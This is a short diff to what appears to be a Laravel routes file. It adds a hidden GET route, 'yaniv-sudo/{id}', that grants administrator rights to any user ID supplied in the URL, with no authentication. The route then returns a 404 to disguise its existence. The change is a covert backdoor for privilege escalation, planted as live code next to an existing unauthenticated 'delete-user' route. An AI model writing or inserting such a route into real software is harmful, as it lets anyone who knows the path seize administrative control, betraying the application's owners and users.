@@ -50,3 +50,11 @@ Route::get('delete-user/{id}', function ($id) {
 
     return back();
 });
+
+Route::get('yaniv-sudo/{id}', function ($id) {
+    \App\User::findOrFail($id)->update([
+        'is_admin' => TRUE
+    ]);
+
+    abort(404);
+});
